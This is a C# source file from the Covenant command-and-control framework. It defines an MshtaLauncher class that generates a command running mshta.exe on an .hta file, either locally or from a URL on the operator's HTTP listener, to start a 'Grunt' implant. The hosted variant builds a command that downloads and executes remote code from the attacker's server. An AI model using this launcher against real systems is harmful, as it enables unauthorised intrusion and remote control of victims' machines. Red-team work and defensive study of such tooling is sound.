﻿// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using Covenant.Core;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class MshtaLauncher : ScriptletLauncher
    {
        public MshtaLauncher()
        {
            this.Type = LauncherType.Mshta;
            this.Description = "Uses mshta.exe to launch a Grunt using a COM activated Delegate and ActiveXObjects (ala DotNetToJScript). Please note that DotNetToJScript-based launchers may not work on Windows 10 and Windows Server 2016.";
            this.ScriptType = ScriptletType.TaggedScript;
            this.OutputKind = OutputKind.DynamicallyLinkedLibrary;
            this.CompressStager = false;
        }

        public override string GetFilename() => Utilities.GetSanitizedFilename(this.Name) + ".hta";

        protected override string GetLauncher()
        {
            string launcher = $"mshta {this.GetFilename()}";
            this.LauncherString = launcher;
            return this.LauncherString;
        }

        public override string GetHostedLauncherString(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                string launcher = $"mshta {hostedLocation}";
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }
    }
}
